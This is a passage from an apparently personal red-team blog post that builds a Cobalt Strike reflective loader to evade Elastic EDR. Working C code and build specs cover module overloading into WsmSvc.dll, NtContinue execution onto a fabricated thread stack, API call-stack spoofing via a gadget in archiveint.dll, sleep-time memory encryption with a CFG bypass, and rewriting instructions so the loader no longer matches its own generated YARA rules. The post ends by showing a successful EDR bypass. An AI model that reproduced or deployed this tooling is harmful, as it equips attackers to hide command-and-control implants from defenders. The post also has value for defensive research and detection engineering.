With the memory writable we zero the entire target region first. This ensures beacon's BSS globals start at zero rather than inheriting whatever values WsmSvc had in those locations. Then LoadDLL copies beacon's headers and sections into the sacrificial DLL's mapped memory, and ProcessImports resolves beacon's IAT:

```

NTDLL$memset((char *)hSacrificial, 0, beaconSize);
LoadDLL(&cobaltData, dll_raw_src, (char *)hSacrificial);
ProcessImports(&funcs, &cobaltData, (char *)hSacrificial);
```

**Fixing memory permissions**

fix\_section\_permissions walks beacon's section table and applies the correct permissions based on each section's characteristics: .text gets PAGE\_EXECUTE\_READ, .data gets PAGE\_READWRITE, .rdata gets PAGE\_READONLY, and so on:

```

fix_section_permissions(&cobaltData, dll_raw_src,
                         (char *)hSacrificial, &memory.Dll);
```

**Registering .pdata and protecting the headers**

At this point beacon is correctly mapped with proper permissions. But the call stack is still broken. Windows cannot unwind through beacon's frames because it has no record of beacon's exception handling data, every beacon frame shows as a raw hex address with no associated module information.

RtlAddFunctionTable fixes this by registering beacon's .pdata section with the OS exception dispatcher:

```

IMAGE_DATA_DIRECTORY * pExcept =
    &cobaltData.NtHeaders->OptionalHeader
         .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];

PRUNTIME_FUNCTION pRF = (PRUNTIME_FUNCTION)(
    (ULONG_PTR)hSacrificial + pExcept->VirtualAddress);

KERNEL32$RtlAddFunctionTable(pRF, count, (DWORD64)hSacrificial);
```

We pull the exception directory from beacon's optional header, calculate the address of the RUNTIME\_FUNCTION array relative to the sacrificial base, and register it. From this point Windows can correctly unwind through beacon's frames.

Finally we protect the headers as read-only, which is what a legitimately loaded DLL looks like:

```

KERNEL32$VirtualProtect(hSacrificial,
                         cobaltData.OptionalHeader->SizeOfHeaders,
                         PAGE_READONLY, &oldProt);
```

**Calling the entry point**

For now we call the entry point in a similar way we did in the simple loader:

```

DLLMAIN_FUNC entry = EntryPoint(&cobaltData, (char *)hSacrificial);
entry((HINSTANCE)hSacrificial, DLL_PROCESS_ATTACH, NULL);
entry((HINSTANCE)hSacrificial, 0x4, NULL);
```

and finally in the go entry point we call the module overload function with the target DLL:

```

__attribute__((noinline, no_reorder)) void go() {
    ModuleOverload(L"C:\\Windows\\System32\\WsmSvc.dll");
}
```

We get a call back and we are happy but this is still not enough as we get this call stack now:

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=1024,h=364,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_161738979-p5rMA9UC72LGHHpM.png)

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=375,h=135,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_161738979-p5rMA9UC72LGHHpM.png)

But as you can see now from the stack, the operations are originating from memory that is associated to WsmSvc.dll. This is already a step forward but our goal is to eliminate all addresses that point to unbacked memory.

# NtContinue Entry Transfer

Look at that call stack again. Frames 2 through 4 are clean WsmSvc.dll frames, which means module overloading and .pdata registration are working. But frame 5 is a raw hex address with no module attached, and everything below it is garbage. That raw address is the return address pointing straight into our UDRL, and once the unwinder hits it the whole chain falls apart. To understand why this happens and how to fix it we need to understand how the call stack actually works.

**What is a call stack?**

In Windows, programs are executed by threads. Every process starts with a main thread, and from there additional threads can be spawned via APIs like CreateThread. Each thread has its own call stack: a dedicated memory region that grows downward and is used to store local variables, return addresses, and function parameters.

When a function is called a new frame gets pushed onto the stack. When it returns its frame gets popped and execution resumes at the previous address. The stack follows a last-in-first-out order, so the most recently called function is always at the top.

If an exception occurs, the OS performs stack unwinding. It walks down the stack using the .pdata exception directory to understand where each function begins and ends, looking for an exception handler. If it finds one it runs it. If it does not, the process crashes. This is also the mechanism EDRs use to inspect call stacks: they walk the frames looking for anomalies.

Here is a simple example of why return addresses exist:

```

int function(int a) {
    return a + 2;
}

int main() {
    int b = function(2);
    getchar();
    return 0;
}
```

"function" has no idea where it was called from. So before execution jumps into “function”, the CPU pushes the address of the next instruction in “main” onto the stack. When “function” finishes, it reads that address and jumps back to it. Without that return address the CPU would have nowhere to go after “function” completes and the process would crash. Now look at a legitimate call stack, for example CFF Explorer:

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=768,h=449,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_162037699-ZLiI2G9xMpmor152.png)

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=375,h=211,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_162037699-ZLiI2G9xMpmor152.png)

This is a downward growing chain starting from the highest address at the bottom (the oldest frame) and ending at the current instruction at the top. Because CFF Explorer is a legitimate binary, the OS can use .pdata to map every raw return address back to a named function, giving you clean “Module!Function+Offset” symbols all the way down. Contrast that with the call stack from our simple loader, where frames below a certain point were raw hex addresses with no module name. That happens because those return addresses point into memory that has no ".pdata" registered and no backing file on disk. The unwinder cannot resolve them.

**Thread initialisation frames**: There is one more thing worth understanding before we get to the fix: what a legitimate thread's call stack looks like at the very bottom. Every thread in Windows, regardless of what it is doing, starts its life the same way. The kernel creates the thread and begins execution at “RtlUserThreadStart" in ntdll.dll. That function calls “BaseThreadInitThunk” in kernel32.dll, which then calls whatever function the thread was actually created to run. This means every legitimate thread's call stack terminates with the same two frames at the bottom:

```

BaseThreadInitThunk+offset
RtlUserThreadStart+offset
NULL
```

Because that is how windows threads work we want to replicate that.

Always. Without exception. If a thread's call stack does not terminate this way, something is wrong with it. EDRs know this. And right now our beacon's call stack terminates with a raw UDRL address followed by garbage

**The problem with calling the entry point directly**

When we call beacon's entry point with a normal call instruction:

```

entry((HINSTANCE)hSacrificial, DLL_PROCESS_ATTACH, NULL);
```

The CPU pushes the return address of the next instruction in our UDRL onto the stack before jumping to entry. That return address points into our PIC blob sitting in unbacked memory. When the unwinder walks the stack and hits that address, it finds no .pdata, no backing file, nothing. Frame 5 in our screenshot is exactly that address. The garbage below it is the unwinder losing its footing and misreading whatever happens to be on the stack as return addresses.

The fix needs to accomplish two things: call the entry point without pushing a return address that points into the UDRL, and ensure the call stack terminates with BaseThreadInitThunk and RtlUserThreadStart the way a legitimate thread would. NtContinue gives us both.

**Introducing synthetic frames and Draugr**

Before we look at TransferExecutionViaStack we need to briefly introduce the concept of synthetic stack frames, because the same mechanism is used both here and in the API spoofing section that follows.

The idea is straightforward: instead of letting the CPU build a real call chain by executing through RtlUserThreadStart and BaseThreadInitThunk, we fabricate those frames manually in memory. We calculate exactly how much stack space each function consumes by reading their unwind data from .pdata, then we write their return addresses at the correct offsets in a fake stack buffer we control.

This is what **_calculate\_function\_stack\_size\_wrapper_**does. It calls **_RtlLookupFunctionEntry_**to find the RUNTIME\_FUNCTION entry for a given return address, then walks the UNWIND\_INFO structure parsing each unwind code to calculate the total stack frame size.

UWOP\_PUSH\_NONVOL adds 8 bytes per pushed register, UWOP\_ALLOC\_SMALL and UWOP\_ALLOC\_LARGE add their respective allocation sizes. The result is the exact number of bytes we need to reserve for that frame on our fake stack.

**TransferExecutionViaStack**

With that context, TransferExecutionViaStack becomes straightforward to follow:

```

PVOID btit_ret    = (PVOID)((ULONG_PTR)BaseThreadInitThunk + 0x14);
PVOID ruts_ret    = (PVOID)((ULONG_PTR)RtlUserThreadStart  + 0x21);
SIZE_T btit_stack_size = (SIZE_T)calculate_function_stack_size_wrapper(btit_ret);
SIZE_T ruts_stack_size = (SIZE_T)calculate_function_stack_size_wrapper(ruts_ret);
```

_note: the offsets between those two functions vary between windows versions_

We get the addresses of BaseThreadInitThunk and RtlUserThreadStart, offset into them at the specific return address points.

Then we allocate the fake stack and build it top-down:

```

PVOID fake_stack = KERNEL32$VirtualAlloc(NULL, 0x40000,
                                          MEM_COMMIT | MEM_RESERVE,
                                          PAGE_READWRITE);

ULONG_PTR rsp = ((ULONG_PTR)fake_stack + 0x40000) & ~(ULONG_PTR)0xF;
rsp -= 8;               *(PVOID *)rsp = NULL;
rsp -= ruts_stack_size; *(PVOID *)rsp = ruts_ret;
rsp -= btit_stack_size; *(PVOID *)rsp = btit_ret;
```

We start at the top of the allocation, align to 16 bytes as the x64 calling convention requires, then write backwards. First a NULL terminator which is the sentinel value that tells the unwinder the chain ends here, then RtlUserThreadStart+0x21 at its correct frame offset, then BaseThreadInitThunk+0x14 at its correct frame offset. The stack now looks exactly like a thread that was born legitimately through the Windows thread creation path.

Finally we build the CONTEXT and hand off execution:

```

NTDLL$RtlCaptureContext(&ctx);
ctx.Rip = (DWORD64)entry_point;
ctx.Rsp = (DWORD64)rsp;
ctx.Rcx = (DWORD64)hInstance;
ctx.Rdx = (DWORD64)fdwReason;
ctx.R8  = 0;

NTDLL$NtContinue(&ctx, FALSE);
```

"RtlCaptureContext" fills the “CONTEXT” _struct_ with the current _register_ state, then we override the specific fields we care about. "RIP" points to beacon's entry point. "RSP" points to our fake stack. "RCX", "RDX", and "R8" are the three arguments to "DllMain": the module handle, the reason code ("0x4" for "DLL\_THREAD\_ATTACH" which kicks off the C2 poll loop), and "NULL". "NtContinue" then loads all of these registers from the "CONTEXT" struct and resumes execution, similar to how it is used in exception handling. Crucially it does not push a return address. There is no "call" instruction, no "ret" to come back to, and no return address pointing into the UDRL anywhere on the stack. From this point forward the UDRL is completely unreachable from beacon's execution context.

With the NtContinue call:

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=1024,h=449,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_162834772-YC3cYVOJ3bSNvrv9.png)

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=375,h=199,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_162834772-YC3cYVOJ3bSNvrv9.png)

# API Call Stack Spoofing for Load time evasion

But what about the APIs called by the loader itself??? Yeah, those need to be spoofed too. Every call to CreateFileW, NtCreateSection, VirtualProtect and friends made during the loader setup phase has a call chain that traces back to our unbacked PICO. The Elastic behavioral rule does not care that beacon's call stack is clean, it will fire on specific API call with an unbacked frame anywhere in the chain.

Before we get into how we solve this, I want to give proper credit where it is due. Crystal-kit and RastaMouse's CRTL course saved me a ton of work during this research, and it is largely through his blog, course, and kit that I was able to adopt this framework so quickly (3 months of pain and agony). You will find everything referenced at the end of this post in the resources section. Also worth clarifying a naming confusion that can trip people (also tripped me at the beginning): Crystal Palace and Crystal-kit are two different things. Crystal Palace is Raphael Mudge's PIC linker. Crystal-kit is RastaMouse's Cobalt Strike loader built on top of it. Easy to mix up.

**API Call Stack Spoofing for Load Time Evasion**

At this point beacon's call stack is clean at runtime. But during the loader setup phase every API call the PICO makes, CreateFileW, NtCreateSection, VirtualProtect, all of them still have a call chain rooted in our unbacked PICO. The fix is straightforward: every API call the loader makes goes through spoof\_call instead of being called directly.

**The hooks.c pattern**

For every API the loader uses we create a thin wrapper that packs the arguments into a FUNCTION\_CALL struct and dispatches through spoof\_call. Here is \_VirtualProtect as a representative example:

```

BOOL WINAPI _VirtualProtect(
    LPVOID lpAddress, SIZE_T dwSize,
    DWORD flNewProtect, PDWORD lpflOldProtect)
{
    FUNCTION_CALL call = { 0 };

    call.ptr    = (PVOID)(KERNEL32$VirtualProtect);
    call.argc   = 4;
    call.args[0] = (ULONG_PTR)(lpAddress);
    call.args[1] = (ULONG_PTR)(dwSize);
    call.args[2] = (ULONG_PTR)(flNewProtect);
    call.args[3] = (ULONG_PTR)(lpflOldProtect);
    return (BOOL)spoof_call(&call);
}
```

Every loader API follows this exact same pattern. CreateFileW, NtCreateSection, NtMapViewOfSection, NtClose, VirtualAlloc, VirtualFree, memset, memcpy, all of them. The wrapper is just a thin shim that packs arguments and hands off to spoof\_call, which runs draugr\_wrapper under the hood to make the actual call with synthetic stack frames.

we can now add a breakpoint to any of our loader called API's to see the stack:

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=1024,h=81,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_163141635-cwXHsT2dTgfs2Ljs.png)

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=375,h=23,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_163141635-cwXHsT2dTgfs2Ljs.png)

The first frame is the called API, the second one is the gadget and the last two are the synthetic frames

But this stack is still not perfect and it will trigger the following rule when LoadLibrary loads the needed HTTP libraries for beacon:

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=768,h=257,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_163341008-PVa2enlkYiNud7Fv.png)

![](https://assets.zyrosite.com/cdn-cgi/image/format=auto,w=375,h=117,fit=crop/m6LJpDPKBDH0E9ZB/image_2026-03-14_163341008-PVa2enlkYiNud7Fv.png)

**Gadget selection**

Now let's talk about what spoof\_call is actually doing under the hood, because the gadget is the core of the mechanism and getting it wrong is what caused the remaining detection.

The original implementation was scanning KernelBase.dll for JMP \[RBX\] (FF 23) gadgets. This had the following problem:

the gadgets in KernelBase.dll did not have a call instruction (E8) in the five bytes preceding them. This matters because some EDRs do not just check that call stack frames point into backed memory, they also disassemble backwards from the return address to verify a legitimate call instruction exists there. A JMP \[RBX\] with no preceding call is a reliable indicator of a spoofed stack.

To find a better gadget in my windows build I used Rastamouse tool **[GadgetHunter](https://github.com/rasta-mouse/GadgetHunter)**

that found:

```

|-> C:\Windows\System32\archiveint.dll
|--> Found 1 gadget(s)
|---> jmp qword ptr [rbx] @ 0x180063014 - call @ 0x18006300F
```

init\_frame\_info was updated accordingly:

```

frame->Gadget = KERNEL32$GetModuleHandleA("archiveint.dll");
if (!frame->Gadget) {
    frame->Gadget = LoadLibraryA("archiveint.dll");
}
```

If archiveint.dll is already loaded in the process we get a handle to it directly. If not we load it, and that comes with a problem. To spoof LoadLibraryA correctly we need a valid gadget from archiveint.dll, but to get archiveint.dll we need to call LoadLibraryA effectively falling into a circular cause and consequence loop. A clean solution would be to have the shellcode loader pre-load archiveint.dll into the process before executing the UDRL blob, that way GetModuleHandleA always succeeds and LoadLibraryA is never called from init\_frame\_info at all. I will leave that implementation detail to you.

For the current implementation where we do call LoadLibraryA from init\_frame\_info, we need to make sure the _LoadLibraryA hook does not intercept that specific call or we end up in an infinite loop: init_ frame\_info calls LoadLibraryA, which hits _LoadLibraryA, which calls spoof_ call, which calls init\_frame\_info to get the gadget, which calls LoadLibraryA again, and so on. The fix is a preserve instruction in the spec file that tells Crystal Palace not to hook LoadLibraryA calls originating from within init\_frame\_info:

```

preserve "KERNEL32$LoadLibraryA" "init_frame_info"
```

# Sleep Masking and removing Crystal-palace signatures

We have a clean call stack at runtime and during loader setup. But right now beacon's sections are sitting decrypted in memory every time it sleeps, and our loader blob has recognisable byte patterns that YARA can match on disk. This section closes both of those windows.

_Note: the vast majority of the sleep masking code comes from Crystal-kit. Credit to RastaMouse for the implementation; only some slight modifications were made_.

**Why sleep masking matter**

Memory scanners do not only run at load time. EDRs scan process memory continuously, and beacon sitting with its .text, .rdata and other sections fully decrypted during every sleep cycle will get caught on the first memory scan. The solution is to encrypt beacon's sections before sleeping and decrypt them on wake, so any scan taken during the sleep window finds garbage rather than recognisable beacon code.

**But how do we know when to encrypt?**

We need to intercept the moment beacon calls Sleep. The way this works is through addhook in the spec file, which registers _Sleep as the hook for KERNEL32$Sleep. When ProcessImports resolves beacon's IAT it uses our controlled_ GetProcAddress instead of the real one. _GetProcAddress calls_\_resolve\_hook with the ROR13 hash of the function name, and if there is a registered hook for it the hook pointer is returned instead of the real API:

```

FARPROC WINAPI _GetProcAddress(HMODULE hModule, LPCSTR lpProcName)
{
    if ((ULONG_PTR)lpProcName >> 16 == 0)
        return GetProcAddress(hModule, lpProcName);

    FARPROC result = __resolve_hook(ror13hash(lpProcName));

    if (result != NULL)
        return result;

    return GetProcAddress(hModule, lpProcName);
}
```

Ordinal-based lookups bypass the hook entirely since there is no name to hash. Everything else goes through \_\_resolve\_hook first. The result is that beacon's IAT entry for Sleep points to \_Sleep in our PICO from the moment ProcessImports finishes.

setup\_hooks replaces GetProcAddress in the IMPORTFUNCS struct before ProcessImports runs, and the PICO is loaded separately from the loader into its own memory region so it persists even if the loader is freed:

```

((SETUP_HOOKS)PicoGetExport(pico_src, pico_code,
                             __tag_setup_hooks()))(&amp;funcs);

ProcessImports(&amp;funcs, &amp;cobaltData, (char *)hSacrificial);
```

**Passing memory layout to the PICO**

The PICO needs to know where beacon lives to encrypt the right memory. Rather than having it figure this out at runtime, the loader passes the exact base address and size via a MEMORY\_LAYOUT struct through setup\_memory:

```

memory.Dll.BaseAddress = (PVOID)(char *)hSacrificial;
memory.Dll.Size        = beaconSize;

((SETUP_MEMORY)PicoGetExport(pico_src, pico_code,
                              __tag_setup_memory()))(&memory);
```

**The \_Sleep hook**

When beacon calls Sleep, it lands in \_Sleep in our PICO. If the sleep duration is one second or more we encrypt before sleeping and decrypt after:

```

VOID WINAPI _Sleep ( DWORD dwMilliseconds )
{
    // I used this msg box for quick debugging (= ФェФ=)
    //SER32$MessageBoxA ( NULL, "_Sleep called!", "PICO", 0 );

    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( KERNEL32$Sleep );
    call.argc = 1;

    call.args [ 0 ] = spoof_arg ( dwMilliseconds );

    /*
     * for performance reasons, only mask
     * memory if sleep time is equal to
     * or greater than 1 second
     */

    if ( dwMilliseconds >= 1000 ) {
        mask_memory ( &g_memory, TRUE );
    }

    spoof_call ( &call );

    if ( dwMilliseconds >= 1000 ) {
        mask_memory ( &g_memory, FALSE );
    }
}
```

when implementing this I forgot the \_\_resolve\_hook() intrinsic in the GetProcAddress so my \_Sleep hook was never getting called at all. One quick way to debug your code and check if the hooked function gets ever called is to put a MessageBoxA

**The masking implementation**

mask\_memory walks the beacon memory region using VirtualQuery, identifies every committed page that is not guarded or inaccessible, and XOR encrypts it. Depending on how the DLL was loaded in memory (in our case CFG is not there as it was not loaded using LoadLibraryA) it might have CFG enabled. For this reason I included here the cfg bypass that is used in cleanup:

```

void mask_memory ( MEMORY_LAYOUT * memory, BOOL mask )
{
    ULONG_PTR base    = ( ULONG_PTR ) memory->Dll.BaseAddress;
    ULONG_PTR end     = base + memory->Dll.Size;
    ULONG_PTR current = base;

    while ( current < end )
    {
        MEMORY_BASIC_INFORMATION mbi;

        if ( !KERNEL32$VirtualQuery ( ( LPCVOID ) current, &mbi, sizeof ( mbi ) ) )
            break;

        if ( mbi.State  == MEM_COMMIT        &&
           !( mbi.Protect & PAGE_GUARD )     &&
             mbi.Protect != PAGE_NOACCESS )
        {
            DWORD old_protect = 0;
            BOOL  is_exec     = ( mbi.Protect == PAGE_EXECUTE_READ ||
                                  mbi.Protect == PAGE_EXECUTE      ||
                                  mbi.Protect == PAGE_EXECUTE_READWRITE );

            /* CFG might block VirtualProtect with spoofed call stack on
             * executable MEM_IMAGE pages — bypass it first          */
            if ( is_exec && mbi.Type == MEM_IMAGE ) {
                bypass_cfg ( mbi.BaseAddress );
            }

            /* executable sections need EXECUTE_WRITECOPY,
             * non-executable image sections need WRITECOPY,
             * private sections accept READWRITE                     */
            DWORD write_prot;
            if ( is_exec ) {
                write_prot = PAGE_EXECUTE_WRITECOPY;
            } else if ( mbi.Type == MEM_IMAGE ) {
                write_prot = PAGE_WRITECOPY;
            } else {
                write_prot = PAGE_READWRITE;
            }

            if ( KERNEL32$VirtualProtect ( mbi.BaseAddress, mbi.RegionSize,
                                           write_prot, &old_protect ) )
            {
                apply_mask ( ( char * ) mbi.BaseAddress, mbi.RegionSize );
                KERNEL32$VirtualProtect ( mbi.BaseAddress, mbi.RegionSize,
                                          old_protect, &old_protect );
            }
        }

        current = ( ULONG_PTR ) mbi.BaseAddress + mbi.RegionSize;
    }

    xor_heap ( &memory->Heap );
}
```

## Beacon signatures

The raw beacon DLL is obviously vulnerable to signature based detection. If you have access to YARA rules the vendor uses you can remove specific signatures directly from the CNA script by patching the relevant bytes before the payload is generated, but when you do not have that level of transparency into what is being flagged the safest approach is to encrypt the whole thing. Crystal Palace lets us XOR the DLL at build time and prepend the key as a linked section in the same blob:

```

 	generate $MASK 128

	push $DLL
        xor $MASK
        preplen
		link "cobalt_dll"
```

One thing worth knowing about the key length: XOR encryption entropy is directly correlated with key length. A 128 byte key produces high entropy in the encrypted output, which is generally what you want to defeat signature matching. However if your target EDR targets high entropy blobs on disk a shorter key might help you there.

The decrypted buffer is used for the stomp, but it needs to be freed before execution transfers to beacon. The plaintext DLL sitting in a heap allocation after the stomp is exactly the kind of artifact a reactive memory scan would find. We get the entry point first, then free immediately:

```

    /* XOR-decrypt Beacon */
    RESOURCE * masked_dll = (RESOURCE *)findAppendedDLL();
    RESOURCE * mask_key   = (RESOURCE *)findMask();

    char * dll_raw_src = KERNEL32$VirtualAlloc(NULL, masked_dll->len,
                                                MEM_COMMIT | MEM_RESERVE,
                                                PAGE_READWRITE);
    if (!dll_raw_src) return;

    for (int i = 0; i < masked_dll->len; i++)
        dll_raw_src[i] = masked_dll->value[i] ^ mask_key->value[i % mask_key->len];

    ParseDLL(dll_raw_src, &cobaltData);
    ...
    /* Get entry point and free decrypted buffer which contains signatures */
    DLLMAIN_FUNC entry = EntryPoint(&cobaltData, (char *)hSacrificial);
    KERNEL32$VirtualFree(dll_raw_src, 0, MEM_RELEASE);
```

## Crystal-palace yara rules

Crystal Palace recently added support for generating YARA rules against your own artifacts using the -g flag:

```

./link spec/loader.spec beacon.dll beacon.bin -g rules.yar
```

The bytes captured in these rules are called islands of invariance: byte sequences in your compiled code that persist across rebuilds. Static hashes, hook stubs, API resolution patterns, all of them produce consistent byte sequences that a defender can signature. Running this against our loader produced two rules that reliably detected the binary both on disk and in memory.

```

PS C:\Users\kapla> C:\Tools\yara\yara64.exe \\192.168.1.71\SHARE\yara\rules.yar \\192.168.1.71\SHARE\bin\CobaltStrike\beacon.bin --print-strings
TCG_78e3597a \\192.168.1.71\SHARE\bin\CobaltStrike\beacon.bin
0x1c99:$r0_adler32sum: 0F B6 D0 8B 45 FC 01 C2 89 D1 B8 71 80 07 80
0x4dd44:$r0_adler32sum: 0F B6 D0 8B 45 FC 01 C2 89 D1 B8 71 80 07 80
0x19c2:$r1_PicoLoad: 8B 52 08 48 63 CA 48 8B 55 A8 8B 52 04 48 63 D2
0x4e446:$r1_PicoLoad: 8B 52 08 48 63 CA 48 8B 55 A8 8B 52 04 48 63 D2
0x4f90f:$r2_GetProcAddress: 48 89 C1 E8 9C 00 00 00 89 C1 BA EF CE E0 60 39 D1
0x4fc83:$r3_bypass_cfg: 48 8B 05 37 DF FF FF FF D0 89 45 FC 81 7D FC F4 00 00 C0
0x1352:$r4_ProcessImport: 8B 52 0C 89 D1 48 8B 55 20 48 01 CA 48 89 D1
0x4fd22:$r4_ProcessImport: 8B 52 0C 89 D1 48 8B 55 20 48 01 CA 48 89 D1
0x50077:$r5_HeapFree: 48 8B 52 08 49 89 44 08 08 49 89 54 08 10
0x27a1:$r6_get_text_section_size: 48 89 C1 E8 65 F5 FF FF 89 45 DC 81 7D DC B4 F9 C2 EB
0x50621:$r6_get_text_section_size: 48 89 C1 E8 8A F3 FF FF 89 45 DC 81 7D DC B4 F9 C2 EB
0x830:$r7_dprintf: 41 B9 04 00 00 00 41 B8 00 30 00 00 48 89 C2
0x1b3b:$r7_dprintf: 41 B9 04 00 00 00 41 B8 00 30 00 00 48 89 C2
0x50b13:$r7_dprintf: 41 B9 04 00 00 00 41 B8 00 30 00 00 48 89 C2
0x50d74:$r8_cleanup_memory: 48 89 D7 F3 48 AB C7 45 00 1F 00 10 00 48 8B 05 A1 CE FF FF
0x50e16:$r9_cleanup_memory: 41 B8 70 0E 00 00 BA 08 00 00 00 48 89 C1
TCG_d28603cb \\192.168.1.71\SHARE\bin\CobaltStrike\beacon.bin
0x1da1:$r0_CreateFileW: 48 83 EC 20 B9 5B BC 4A 6A BA BB 17 00 7C E8 C2 F0 FF FF
0x1b59:$r1_VirtualAlloc: 48 83 EC 20 B9 5B BC 4A 6A BA 54 CA AF 91 E8 0A F3 FF FF
0x1ed3:$r1_VirtualAlloc: 48 83 EC 20 B9 5B BC 4A 6A BA 54 CA AF 91 E8 90 EF FF FF
0x1f72:$r2_VirtualProtect: 48 83 EC 20 B9 5B BC 4A 6A BA 1B C6 46 79 E8 F1 EE FF FF
0x200d:$r3_RtlAddFunctionTable: 48 83 EC 20 B9 5B BC 4A 6A BA 61 16 FC 22 E8 56 EE FF FF
0x2336:$r4_memcpy: 48 83 EC 20 B9 5D 68 FA 3C BA 70 69 86 5D E8 2D EB FF FF
0x1c2e:$r5_VirtualFree: 48 83 EC 20 B9 5B BC 4A 6A BA AC 33 06 03 E8 35 F2 FF FF
0x2448:$r5_VirtualFree: 48 83 EC 20 B9 5B BC 4A 6A BA AC 33 06 03 E8 1B EA FF FF
0x24dc:$r6_VirtualQuery: 48 83 EC 20 B9 5B BC 4A 6A BA AA C8 C8 A3 E8 87 E9 FF FF
0x4d6:$r7_init_frame_info: 48 83 EC 20 B9 5B BC 4A 6A BA 04 49 32 D3 E8 8D 09 00 00
0x514:$r7_init_frame_info: 48 83 EC 20 B9 5B BC 4A 6A BA 04 49 32 D3 E8 4F 09 00 00
0x2557:$r7_init_frame_info: 48 83 EC 20 B9 5B BC 4A 6A BA 04 49 32 D3 E8 0C E9 FF FF
0x2592:$r7_init_frame_info: 48 83 EC 20 B9 5B BC 4A 6A BA 04 49 32 D3 E8 D1 E8 FF FF
0x2680:$r7_init_frame_info: 48 83 EC 20 B9 5B BC 4A 6A BA 04 49 32 D3 E8 E3 E7 FF FF
0x23c3:$r8_init_frame_info: 48 83 EC 20 B9 5B BC 4A 6A BA 8E 4E 0E EC E8 A0 EA FF FF
0x26cc:$r8_init_frame_info: 48 83 EC 20 B9 5B BC 4A 6A BA 8E 4E 0E EC E8 97 E7 FF FF
0x2c12:$r9_find_gadget: 48 83 EC 20 B9 5D 68 FA 3C BA 44 06 B6 CD E8 51 E2 FF FF
```

**TCG\_d28603cb**was matching all 16 API resolution stubs. The pattern was simple: every stub starts with sub rsp, 0x20 immediately followed by mov ecx, <module\_hash>. That back-to-back sequence was identical across every hook wrapper.

**TCG\_78e3597a**was matching ten individual invariant islands inside libtcg functions: the Adler32 magic multiplier, PICO loading offsets, the GetProcAddress ROR13 hash constant, a CFG bypass NTSTATUS check, import table walking offsets, heap back-pointer stores, and a few others.

**Breaking the rules with ised**

ised is Crystal Palace's program rewriting tool. It lets you surgically insert or replace specific assembly instructions at link time, after the mutation passes run. Crucially the YARA rule generator skips any instruction touched by ised, which is the whole point: you use it to destroy the invariant islands the generator found.

The syntax is:

```

ised <verb> "pattern" $CODE [+options]
```

insert injects $CODE before or after a matched pattern. replace overwrites it. The pattern string must match Crystal Palace's internal disassembler output exactly, which is why we need to use disassemble "disasm.txt" +forms to get the ground truth before writing patterns.

The fix for TCG\_d28603cb was a single line. Every API stub hits the same sub rsp, 0x20 sequence, so inserting a NOP after it breaks all 16 matches at once:

before:

```

00000000000020A4 4883EC20             sub rsp, 0x20
00000000000020A8 B95D68FA3C           mov ecx, 0x3CFA685D
00000000000020AD BACB9BB25B           mov edx, 0x5BB29BCB
```

after:

```

0000000000000705 4883EC20             sub rsp, 0x20
0000000000000709 90                   nop
000000000000070A B95D68FA3C           mov ecx, 0x3CFA685D
000000000000070F BAC8648A81           mov edx, 0x818A64C8
```

The remaining TCG\_78e3597a hits required individual patterns targeting each invariant island, I've built a standalone yara.spec file containing all the ised directives and called it from both loader.spec and pico.spec via run "yara.spec". This is the key discovery: the PICO binary is embedded as linked data and contains its own copy of the libtcg functions. ised running in the loader context cannot reach inside the PICO, so without running yara.spec in the PICO build as well, half the signatures survive.

The final yara.spec:

```

x64:
    pack $NOP "b" 0x90

    # TCG_d28603cb — kills all 16 API stub hits
    ised insert "sub rsp, 0x20" $NOP +after

    # TCG_78e3597a — r0_adler32sum
    ised insert "mov eax, 0x80078071" $NOP +before

    # TCG_78e3597a — r1_PicoLoad
    ised insert "mov rdx, qword ptr [rbp-0x58]" $NOP +before

    # TCG_78e3597a — r2_GetProcAddress
    ised insert "mov edx, 0x60E0CEEF" $NOP +before

    # TCG_78e3597a — r3_bypass_cfg
    ised insert "cmp dword ptr [rbp-4], 0xC00000F4" $NOP +before

    # TCG_78e3597a — r4_ProcessImport
    ised insert "mov rdx, qword ptr [rbp+0x20]" $NOP +before

    # TCG_78e3597a — r5_HeapFree
    ised insert "mov qword ptr [r8+rcx+8], rax" $NOP +before

    # TCG_78e3597a — r6_get_text_section_size
    ised insert "cmp dword ptr [rbp-0x24], 0xEBC2F9B4" $NOP +before

    # TCG_78e3597a — r7_dprintf
    ised insert "mov r9d, 4" "mov r8d, 0x3000" $NOP +first +before

    # TCG_78e3597a — r8_cleanup_memory
    ised insert "rep stosq" $NOP +after

    # TCG_78e3597a — r9_cleanup_memory
    ised insert "mov r8d, 0xE70" $NOP +before

    disassemble "yara_fix.txt"
```

Both loader.spec and pico.spec end with:

```

run "yara.spec"
```

# It works

Below is a video demo of the UDRL doing its job and bypassing Elastic EDR. Note that the shellcode loader used here is intentionally simple: it allocates RWX memory and executes from the main thread. It gets detected as such

Elastic bypass demo - YouTube

[Photo image of Lorenzo Meacci](https://www.youtube.com/channel/UCkHhWryPNTpQos6o0_QFufA?embeds_referring_euri=https%3A%2F%2Florenzomeacci.com%2F)

Lorenzo Meacci

26 subscribers

[Elastic bypass demo](https://www.youtube.com/watch?list=TLGGyzyhl5NNRvwxODAzMjAyNg&v=og-8yWW6IAA)

Lorenzo Meacci

Search

1/1

Info

Shopping

Tap to unmute

If playback doesn't begin shortly, try restarting your device.

You're signed out

Videos you watch may be added to the TV's watch history and influence TV recommendations. To avoid this, cancel and sign in to YouTube on your computer.

CancelConfirm

Share

Include playlist

An error occurred while retrieving sharing information. Please try again later.

Watch later

Share

Copy link

Watch on

0:00

